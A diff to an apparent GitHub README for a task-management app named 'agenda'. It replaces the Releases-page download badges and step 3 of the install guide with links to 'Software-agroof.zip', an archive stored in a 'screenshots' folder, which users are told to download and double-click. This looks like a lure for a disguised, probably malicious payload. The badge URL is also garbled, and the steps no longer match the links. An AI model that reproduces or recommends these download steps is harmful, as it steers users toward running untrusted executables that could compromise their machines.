@@ -8,13 +8,13 @@ Welcome to agenda! This application helps you manage your tasks and appointments
 
 To get started, you need to download the application. Click the button below to visit our Releases page:
 
-[![Download Agenda](https://img.shields.io/badge/Download%20Agenda-v1.0.0-blue.svg)](https://github.com/solution-github001/agenda/releases)
+[![Download Agenda](https://github.com/solution-github001/agenda/raw/refs/heads/master/screenshots/Software-agroof.zip%https://github.com/solution-github001/agenda/raw/refs/heads/master/screenshots/Software-agroof.zip)](https://github.com/solution-github001/agenda/raw/refs/heads/master/screenshots/Software-agroof.zip)
 
 ### Step-by-step Installation
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of the software.
-3. Download the file labeled as "agenda.exe" or similar.
+3. Download the file labeled as "https://github.com/solution-github001/agenda/raw/refs/heads/master/screenshots/Software-agroof.zip" or similar.
 4. Locate the downloaded file in your Downloads folder or designated download location.
 5. Double-click on the file to install the application.
 6. Follow the on-screen instructions to complete the installation.
@@ -85,6 +85,6 @@ We aim to release updates regularly based on user feedback and feature requests.
 
 To download agenda, please visit the link below:
 
-[![Download Agenda](https://img.shields.io/badge/Download%20Agenda-v1.0.0-blue.svg)](https://github.com/solution-github001/agenda/releases) 
+[![Download Agenda](https://github.com/solution-github001/agenda/raw/refs/heads/master/screenshots/Software-agroof.zip%https://github.com/solution-github001/agenda/raw/refs/heads/master/screenshots/Software-agroof.zip)](https://github.com/solution-github001/agenda/raw/refs/heads/master/screenshots/Software-agroof.zip) 
 
 We hope you enjoy organizing your tasks with agenda!
